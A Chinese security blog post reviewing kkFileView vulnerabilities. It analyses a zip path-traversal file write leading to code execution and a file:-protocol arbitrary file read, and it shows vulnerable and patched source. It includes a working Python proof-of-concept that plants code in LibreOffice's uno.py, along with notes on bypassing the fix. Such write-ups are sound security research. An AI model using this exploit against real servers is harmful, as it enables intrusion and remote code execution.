<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>kkFileView历史漏洞总结 | ph0ebus&#39;s Blog</title>
  <meta name="author" content="ph0ebus">
  
  <meta name="description" content="kkFileView历史漏洞总结">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="kkFileView历史漏洞总结"/>
  <meta property="og:site_name" content="ph0ebus&#39;s Blog"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/search.xml" title="ph0ebus&#39;s Blog" type="application/atom+xml">
  
  
    <link href="/favicon.ico" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 7.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">ph0ebus&#39;s Blog</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/search.xml" title="Subscribe me.">
			  <i class="fa fa-user"></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> kkFileView历史漏洞总结</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  
		 <div class="alert alert-success description">
			<i class="fa fa-info-circle"></i> kkFileView历史漏洞总结
		 </div> <!-- alert -->
	  		

	  <blockquote>
<p>首发于奇安信攻防社区 <a target="_blank" rel="noopener" href="https://forum.butian.net/article/631">https://forum.butian.net/article/631</a></p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/kekingcn/kkFileView">https://github.com/kekingcn/kkFileView</a></p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>kkFileView为文件文档在线预览解决方案，该项目使用流行的spring boot搭建，易上手和部署，基本支持主流办公文档的在线预览，如doc,docx,xls,xlsx,ppt,pptx,pdf,txt,zip,rar,图片,视频,音频等等</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>以v3.6.0环境搭建为例</p>
<p>首先从dockerhub下载官方docker镜像</p>
<p><img src="https://s2.loli.net/2024/12/20/jZiELl9JxN3g7bk.png" alt="img"></p>
<p>pull下来后执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 8012:8012 -p 5005:5005 -it --entrypoint /bin/bash  keking/kkfileview:v3.6.0</span><br></pre></td></tr></table></figure>

<p>然后手动开启远程调试，至于其他参数可以参考官方镜像的entrypoint</p>
<p><img src="https://s2.loli.net/2024/12/20/vQGySr5zxOehtVA.png" alt="img"></p>
<p><img src="https://s2.loli.net/2024/12/20/GITw7KHxOcim8yn.png" alt="img"></p>
<p>然后在github拉取源码</p>
<p><img src="https://s2.loli.net/2024/12/20/TO1XWZ6A7awpPg9.png" alt="img"></p>
<p>然后丢进IDEA，在配置中添加JVM远程调试，模块选择kkFileView</p>
<p><img src="https://s2.loli.net/2024/12/20/CR8qUMl5nicS3Xs.png" alt="img"></p>
<p>然后正常下断点调试即可</p>
<h1 id="漏洞分析和利用"><a href="#漏洞分析和利用" class="headerlink" title="漏洞分析和利用"></a>漏洞分析和利用</h1><h2 id="任意文件写入导致RCE"><a href="#任意文件写入导致RCE" class="headerlink" title="任意文件写入导致RCE"></a>任意文件写入导致RCE</h2><blockquote>
<p>4.2.0 &lt;&#x3D; kkFileviw &lt;&#x3D; 4.4.0beta（最新分支不受影响）</p>
</blockquote>
<p>可以任意文件上传，并且可以追加文件内容。</p>
<p>kkFileView在使用odt转pdf时会调用系统的Libreoffice，而此进程会调用库中的uno.py文件，因此可以覆盖该py文件的内容，从而在处理odt文件时会执行uno.py中的恶意代码。</p>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>这里官方的docker库中没看到符合的版本，这里就用vulhub的docker复现了，p牛yyds</p>
<p><img src="https://s2.loli.net/2024/12/20/WJBURK7MogsfvzO.png" alt="img"></p>
<p>根据这个项目可以快速复现</p>
<p><a target="_blank" rel="noopener" href="https://github.com/luelueking/kkFileView-v4.3.0-RCE-POC">https://github.com/luelueking/kkFileView-v4.3.0-RCE-POC</a></p>
<p>首先制作一个恶意zip</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        binary1 = <span class="string">b&#x27;ph0ebus&#x27;</span></span><br><span class="line">        binary2 = <span class="string">b&#x27;import os\r\nos.system(\&#x27;touch /tmp/ph0ebus\&#x27;)&#x27;</span></span><br><span class="line">        zipFile = zipfile.ZipFile(<span class="string">&quot;poc.zip&quot;</span>, <span class="string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)</span><br><span class="line">        info = zipfile.ZipInfo(<span class="string">&quot;poc.zip&quot;</span>)</span><br><span class="line">        zipFile.writestr(<span class="string">&quot;test&quot;</span>, binary1)</span><br><span class="line">        zipFile.writestr(<span class="string">&quot;../../../../../../../../../../../../../../../../../../../opt/libreoffice7.5/program/uno.py&quot;</span>, binary2)</span><br><span class="line">        zipFile.close()</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> e</span><br></pre></td></tr></table></figure>

<p>上传zip并预览，需要注意的是url的问题，由于这里在本地虚拟机跑的，docker容器访问不到192.168.182.1&#x2F;24的段，于是默认的预览会连接超时，可以重新设置相关环境变量的url，也可以手动改一下参数值</p>
<p><img src="https://s2.loli.net/2024/12/20/SGBqITL41FQkAdl.png" alt="img"></p>
<p><img src="https://s2.loli.net/2024/12/20/N5odTpvZGlFK731.png" alt="img"></p>
<p>进容器查看一下uno.py的文件内容，可以看到文件末尾追加了恶意代码</p>
<p><img src="https://s2.loli.net/2024/12/20/w5Yl4HsaONWRyFc.png" alt="img"></p>
<p>然后随便在office创建一个odt文件</p>
<p><img src="https://s2.loli.net/2024/12/20/WXUe4sAYH2vNFfK.png" alt="img"></p>
<p>上传并预览</p>
<p><img src="https://s2.loli.net/2024/12/20/rgHJ3GdMDbsWSep.png" alt="img"></p>
<p>成功触发格式转换，并执行uno.py的恶意代码，创建了指定文件</p>
<p><img src="https://s2.loli.net/2024/12/20/CBnyipxASOv9JWb.png" alt="img"></p>
<p><img src="https://s2.loli.net/2024/12/20/kb1hJs8XfOYoLiw.png" alt="img"></p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="https://s2.loli.net/2024/12/20/re3GoH7Muw8FVYJ.png" alt="img"></p>
<p>跟进<code>cn.keking.service.impl.CompressFilePreviewImpl#filePreviewHandle</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">filePreviewHandle</span><span class="params">(String url, Model model, FileAttribute fileAttribute)</span> &#123;</span><br><span class="line">    String fileName=fileAttribute.getName();</span><br><span class="line">    <span class="type">String</span> <span class="variable">filePassword</span> <span class="operator">=</span> fileAttribute.getFilePassword();</span><br><span class="line">    <span class="type">boolean</span> forceUpdatedCache=fileAttribute.forceUpdatedCache();</span><br><span class="line">    <span class="type">String</span> <span class="variable">fileTree</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 判断文件名是否存在(redis缓存读取)</span></span><br><span class="line">    <span class="keyword">if</span> (forceUpdatedCache || !StringUtils.hasText(fileHandlerService.getConvertedFile(fileName))  || !ConfigConstants.isCacheEnabled()) &#123;</span><br><span class="line">        ReturnResponse&lt;String&gt; response = DownloadUtils.downLoad(fileAttribute, fileName);</span><br><span class="line">        <span class="keyword">if</span> (response.isFailure()) &#123;</span><br><span class="line">            <span class="keyword">return</span> otherFilePreview.notSupportedFile(model, fileAttribute, response.getMsg());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> response.getContent();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fileTree = compressFileReader.unRar(filePath, filePassword,fileName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Throwable[] throwableArray = ExceptionUtils.getThrowables(e);</span><br><span class="line">            <span class="keyword">for</span> (Throwable throwable : throwableArray) &#123;</span><br><span class="line">                <span class="keyword">if</span> (throwable <span class="keyword">instanceof</span> IOException || throwable <span class="keyword">instanceof</span> EncryptedDocumentException) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (e.getMessage().toLowerCase().contains(Rar_PASSWORD_MSG)) &#123;</span><br><span class="line">                        model.addAttribute(<span class="string">&quot;needFilePassword&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">                        <span class="keyword">return</span> EXEL_FILE_PREVIEW_PAGE;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!ObjectUtils.isEmpty(fileTree)) &#123;</span><br><span class="line">            <span class="comment">//是否保留压缩包源文件</span></span><br><span class="line">            <span class="keyword">if</span> (ConfigConstants.getDeleteSourceFile()) &#123;</span><br><span class="line">                KkFileUtils.deleteFileByPath(filePath);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (ConfigConstants.isCacheEnabled()) &#123;</span><br><span class="line">                <span class="comment">// 加入缓存</span></span><br><span class="line">                fileHandlerService.addConvertedFile(fileName, fileTree);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> otherFilePreview.notSupportedFile(model, fileAttribute, <span class="string">&quot;压缩文件密码错误! 压缩文件损坏!  压缩文件类型不受支持!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        fileTree = fileHandlerService.getConvertedFile(fileName);</span><br><span class="line">    &#125;</span><br><span class="line">    model.addAttribute(<span class="string">&quot;fileName&quot;</span>, fileName);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;fileTree&quot;</span>, fileTree);</span><br><span class="line">    <span class="keyword">return</span> COMPRESS_FILE_PREVIEW_PAGE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里会下载demo文件下的poc.zip，然后在<code>cn.keking.service.CompressFileReader#unRar</code>执行解压操作</p>
<p><img src="https://s2.loli.net/2024/12/20/jB4EixA8rftUHsm.png" alt="img"></p>
<p>这里在释放压缩包的文件时将被压缩的文件直接与路径进行拼接并将内容写入到对应路径下，由于未对此进行过滤造成了任意文件写入</p>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>漏洞在4.4.0-beta最新版被修复</p>
<p><a target="_blank" rel="noopener" href="https://github.com/kekingcn/kkFileView/commit/421a2760d58ccaba4426b5e104938ca06cc49778">https://github.com/kekingcn/kkFileView/commit/421a2760d58ccaba4426b5e104938ca06cc49778</a></p>
<p>重构了解压逻辑，并加入了路径验证的函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Path <span class="title function_">getFilePathInsideArchive</span><span class="params">(ISimpleInArchiveItem item, Path folderPath)</span> <span class="keyword">throws</span> SevenZipException, UnsupportedEncodingException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">insideFileName</span> <span class="operator">=</span> RarUtils.getUtf8String(item.getPath());</span><br><span class="line">    <span class="keyword">if</span> (RarUtils.isMessyCode(insideFileName)) &#123;</span><br><span class="line">        insideFileName = <span class="keyword">new</span> <span class="title class_">String</span>(item.getPath().getBytes(StandardCharsets.ISO_8859_1), <span class="string">&quot;gbk&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 正规化路径并验证是否安全</span></span><br><span class="line">    <span class="type">Path</span> <span class="variable">normalizedPath</span> <span class="operator">=</span> folderPath.resolve(insideFileName).normalize();</span><br><span class="line">    <span class="keyword">if</span> (!normalizedPath.startsWith(folderPath)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Unsafe path detected: &quot;</span> + insideFileName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Files.createDirectories(normalizedPath.getParent());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Failed to create directory: &quot;</span> + normalizedPath.getParent(), e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> normalizedPath;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>限制了释放后的文件只能在当前目录下</p>
<h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><blockquote>
<p> kkFileView &lt;&#x3D; v3.6.0，&lt;&#x3D; 4.0.0</p>
</blockquote>
<h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p><img src="https://s2.loli.net/2024/12/20/Gm5q4O2TV1RUjNY.png" alt="img"></p>
<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>查看源码，路由内容如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据url获取文件内容</span></span><br><span class="line"><span class="comment"> * 当pdfjs读取存在跨域问题的文件时将通过此接口读取</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> urlPath  url</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> response response</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/getCorsFile&quot;, method = RequestMethod.GET)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getCorsFile</span><span class="params">(String urlPath, HttpServletResponse response)</span> &#123;</span><br><span class="line">    logger.info(<span class="string">&quot;下载跨域pdf文件url：&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> WebUtils.normalizedURL(urlPath);</span><br><span class="line">        <span class="type">byte</span>[] bytes = NetUtil.downloadBytes(url.toString());</span><br><span class="line">        IOUtils.write(bytes, response.getOutputStream());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException | GalimatiasParseException e) &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;下载跨域pdf文件异常，url：&#123;&#125;&quot;</span>, urlPath, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到是一个跨域文件读取的接口，但没有对这里的urlPath做限制，由于支持file协议导致了非预期的本地文件读取</p>
<p>在WebUtils类处理后，传入的file协议字符串解析为<code>galimatias</code> 库的 <code>URL</code>对象，然后通过toJavaURL方法转换为了java原生的URL对象</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> URL <span class="title function_">normalizedURL</span><span class="params">(String urlStr)</span> <span class="keyword">throws</span> GalimatiasParseException, MalformedURLException &#123;</span><br><span class="line">    <span class="keyword">return</span> io.mola.galimatias.URL.parse(urlStr).toJavaURL();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/12/20/uDJVYr7WqPTBmMa.png" alt="img"></p>
<p>接着通过<code>jodd.io.NetUtil#downloadBytes</code>根据URL对象读取字节流</p>
<p><img src="https://s2.loli.net/2024/12/20/nRTA9QGidsluBLX.png" alt="img"></p>
<p>最后通过<code>fr.opensagres.xdocreport.core.io.IOUtils#write</code>方法写入到response中回显</p>
<h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><p>v4.1.0版本中修复后的代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据url获取文件内容</span></span><br><span class="line"><span class="comment"> * 当pdfjs读取存在跨域问题的文件时将通过此接口读取</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> urlPath  url</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> response response</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/getCorsFile&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getCorsFile</span><span class="params">(String urlPath, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (urlPath == <span class="literal">null</span> || urlPath.length() == <span class="number">0</span>)&#123;</span><br><span class="line">        logger.info(<span class="string">&quot;URL异常：&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">        response.setStatus(HttpServletResponse.SC_BAD_REQUEST);</span><br><span class="line">        response.setHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/html; charset=UTF-8&quot;</span>);</span><br><span class="line">        response.getWriter().println(<span class="string">&quot;NULL地址不允许预览&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        urlPath = WebUtils.decodeUrl(urlPath);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        logger.error(String.format(BASE64_DECODE_ERROR_MSG, urlPath),ex);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    HttpURLConnection urlcon;</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (urlPath.toLowerCase().startsWith(<span class="string">&quot;file:&quot;</span>) || urlPath.toLowerCase().startsWith(<span class="string">&quot;file%3&quot;</span>)) &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;读取跨域文件异常，可能存在非法访问，urlPath：&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    logger.info(<span class="string">&quot;下载跨域pdf文件url：&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">    <span class="keyword">if</span> (!urlPath.toLowerCase().startsWith(<span class="string">&quot;ftp:&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> WebUtils.normalizedURL(urlPath);</span><br><span class="line">            urlcon=(HttpURLConnection)url.openConnection();</span><br><span class="line">            urlcon.setConnectTimeout(<span class="number">30000</span>);</span><br><span class="line">            urlcon.setReadTimeout(<span class="number">30000</span>);</span><br><span class="line">            urlcon.setInstanceFollowRedirects(<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (urlcon.getResponseCode() == <span class="number">302</span> || urlcon.getResponseCode() == <span class="number">301</span>) &#123;</span><br><span class="line">                urlcon.disconnect();</span><br><span class="line">                url =<span class="keyword">new</span> <span class="title class_">URL</span>(urlcon.getHeaderField(<span class="string">&quot;Location&quot;</span>));</span><br><span class="line">                urlcon=(HttpURLConnection)url.openConnection();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (urlcon.getResponseCode() == <span class="number">404</span> || urlcon.getResponseCode() == <span class="number">403</span> || urlcon.getResponseCode() == <span class="number">500</span> ) &#123;</span><br><span class="line">                logger.error(<span class="string">&quot;读取跨域文件异常，url：&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(urlPath.contains( <span class="string">&quot;.svg&quot;</span>)) &#123;</span><br><span class="line">                    response.setContentType(<span class="string">&quot;image/svg+xml&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                inputStream=(url).openStream();</span><br><span class="line">                IOUtils.copy(inputStream, response.getOutputStream());</span><br><span class="line">                urlcon.disconnect();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | GalimatiasParseException e) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;读取跨域文件异常，url：&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            IOUtils.closeQuietly(inputStream);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> WebUtils.normalizedURL(urlPath);</span><br><span class="line">            <span class="keyword">if</span>(urlPath.contains(<span class="string">&quot;.svg&quot;</span>)) &#123;</span><br><span class="line">                response.setContentType(<span class="string">&quot;image/svg+xml&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            inputStream = (url).openStream();</span><br><span class="line">            IOUtils.copy(inputStream, response.getOutputStream());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | GalimatiasParseException e) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;读取跨域文件异常，url：&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            IOUtils.closeQuietly(inputStream);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>cn.keking.utils.WebUtils#decodeUrl</code>方法进行一次base64解码</p>
<p><img src="https://s2.loli.net/2024/12/20/GXFtJzoi4TDl3k7.png" alt="img"></p>
<p>虽然我们可以通过<code>url:</code>前缀绕过这里的if判断</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (urlPath.toLowerCase().startsWith(<span class="string">&quot;file:&quot;</span>) || urlPath.toLowerCase().startsWith(<span class="string">&quot;file%3&quot;</span>)) &#123;</span><br><span class="line">    logger.info(<span class="string">&quot;读取跨域文件异常，可能存在非法访问，urlPath：&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是后面的逻辑是将<code>java.net.URLConnection</code>类型转换为<code>java.net.HttpURLConnection</code>，而file协议不支持这个类型转换会报错</p>
<p><img src="https://s2.loli.net/2024/12/20/rWTvAf52thYz1CU.png" alt="img"></p>
<p>如果能在<code>URL url = WebUtils.normalizedURL(urlPath);</code>处理之后将<code>ftp:</code>开头的urlPath，最后通过某种处理造成的差异转换为file协议，即可在else部分调用<code>java.net.URL#openStream</code>成功绕过，但目前只是一个想法，实际并未发现这样的差异</p>
<p>而像gopher等协议，属于是<code>galimatias</code> 库的 <code>URL</code>类支持该协议而 Java8 原生的URL类不认得（在jdk8版本以后被阉割了，jdk7高版本虽然存在，但是需要设置）</p>
<p><a target="_blank" rel="noopener" href="https://bugzilla.redhat.com/show_bug.cgi?id=865541">https://bugzilla.redhat.com/show_bug.cgi?id=865541</a></p>
